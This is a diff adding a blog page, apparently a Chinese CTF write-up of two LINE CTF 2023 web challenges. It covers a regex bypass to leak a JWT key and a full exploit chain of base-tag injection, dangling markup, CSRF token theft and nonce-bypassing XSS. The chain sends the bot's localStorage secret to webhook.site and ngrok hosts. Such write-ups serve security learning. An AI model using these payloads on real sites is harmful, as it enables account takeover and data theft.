@@ -1,0 +1,190 @@
+<!doctype html>
+<html lang="en-us"><head>
+    <title>an4er&#39; blog</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+    <link rel="shortcut icon" href="avatar.jpg" />
+    
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../avatar.jpg"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        an4er
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    Want to be a Ctfer, Developer, Red Team
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../post/" title="Posts">Posts</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../categories/" title="Categories">Categories</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://github.com/an5er" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-2">
+        <div class="mb-3">
+            <h3 class="mb-0">Linectf2023 复现</h3>
+            
+            <small class="text-muted">Published April 11, 2023</small>
+        </div>
+
+        <article>
+            <h2 id="safenote">SafeNote</h2>
+<p>查看路由，发现在admin的controller下存在<code>/feature</code>路由可以执行<code>spel</code>表达式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202303280241462.png" alt="image-20230327204134114"></p>
+<p>那么问题来到怎么去获得admin的权限，在spel路由的上面有一个</p>
+<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202303280241822.png" alt="image-20230327214022459"></p>
+<p>如果从请求头中获得的<code>Authorization</code>解码后不为<code>USER</code>即可返回<code>JWT key</code>，尝试删除<code>Authorization</code>，访问，但是被filter给拦住，查看config，有如下匹配</p>
+<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202303280241026.png" alt="image-20230327213949589"></p>
+<p>符合路径的会在请求到达路由前检查请求头。所以我们需要绕过这个正则，使用%0a可以截断绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202303280241107.png" alt="image-20230327220617335"></p>
+<p>然后利用这key去签名即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202303280241967.png" alt="image-20230327222710707"></p>
+<h2 id="another-secure-store-note">Another Secure Store Note</h2>
+<p>查看附件发现<code>flag</code>放在<code>bot</code>的<code>localStorage</code>中，然后登录后的用户名中存在<code>XSS</code>，但是被CSP限制了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202303282021757.png" alt="image-20230328202126602"></p>
+<p>我们需要有<code>nonce</code>才能执行XSS，因为<code>nonce</code>是随机生成的，然后访问<code>/profile</code>时会访问<code>/csp.gif</code>刷新<code>nonce</code>，为防止<code>nonce</code>刷新，第一个想到的是去修改它的<code>base uri</code> ，又因为<code>base-uri</code>  是  <code>self</code>，所以使用<code>base</code>设置随意的路径来阻断</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">base</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://35.200.57.143:11004/a/&#39;</span>&gt;
+</span></span></code></pre></div><p>然后查看前端，为了执行<code>getSettings.js</code>，使用如下一条语句</p>
+<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202303282028700.png" alt="image-20230328202847588"></p>
+<p>我们需要的<code>nonce</code>明文储存在前端，尝试使用<a href="https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection">Dangling Markup</a>来外带代码，但是更改用户名需要<code>_csrf</code>，所以我们需要最后一步偷到<code>_csrf</code>来串起来。在<code>getSettings.js</code>文件中会为前端填入<code>csrf</code>，所以我们只要执行<code>getSettings.js</code>便能得到对应的<code>_csrf</code>然后直接发送给<code>/porfile</code>即可改名</p>
+<blockquote>
+<p>因为Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用<code>document</code>、<code>window</code>、<code>parent</code>这些对象。</p>
+</blockquote>
+<p>所以在<code>isInWindowContext()</code>中，该函数的实现方式依赖于 <code>self</code> 在当前执行环境中指向的对象与全局作用域中的 <code>self</code> 对象不同这一事实，因此可以通过改变 <code>self</code> 的值来判断当前执行环境是否为浏览器窗口上下文。断绝了使用web worker的使用。这里huli师傅用的<code>Object.defineProperty</code>去直接覆盖<code>document.domain</code>的值，得改名的poc：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Title&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>        Object.<span style="color:#a6e22e">defineProperty</span>(document, <span style="color:#e6db74">&#39;domain&#39;</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;35.200.57.143&#39;</span>
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_csrf&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://35.200.57.143:11004/getSettings.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">f</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">POST</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://35.200.57.143:11004/profile&#34;</span> <span style="color:#a6e22e">target</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_blank&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;poc&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">csrf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_csrf</span>.<span style="color:#a6e22e">value</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">csrf</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">csrf</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">submit</span>()
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>然后构造脚本使其在一个请求中完成</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Title&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>        Object.<span style="color:#a6e22e">defineProperty</span>(document, <span style="color:#e6db74">&#39;domain&#39;</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;35.200.57.143&#39;</span>
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_csrf&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://35.200.57.143:11004/getSettings.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">f</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">POST</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://35.200.57.143:11004/profile&#34;</span> <span style="color:#a6e22e">target</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_blank&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">csrf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_csrf</span>.<span style="color:#a6e22e">value</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">csrf</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">csrf</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;base href=&#39;https://35.200.57.143:11004/a/&#39;&gt;&lt;meta http-equiv=\&#34;refresh\&#34; content=&#39;0; url=https://27be-182-150-123-102.ap.ngrok.io/?a=&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">submit</span>()
+</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">400</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">poll</span>() {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://27be-182-150-123-102.ap.ngrok.io/nonce&#39;</span>)
+</span></span><span style="display:flex;"><span>              .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">res</span> =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>())
+</span></span><span style="display:flex;"><span>              .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">nonce</span> =&gt; {
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">nonce</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">poll</span>, <span style="color:#ae81ff">100</span>)
+</span></span><span style="display:flex;"><span>                  }
+</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;script nonce=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">nonce</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    location = &#39;https://webhook.site/52303597-727c-4c31-adc8-81721b8974a2?flag=&#39;+localStorage.getItem(&#39;secret&#39;)&lt;\/script&gt;`</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">submit</span>()
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">poll</span>()
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202303290035812.png" alt="image-20230329003530662"></p>
+
+        </article>
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+</footer>
+</body>
+</html>
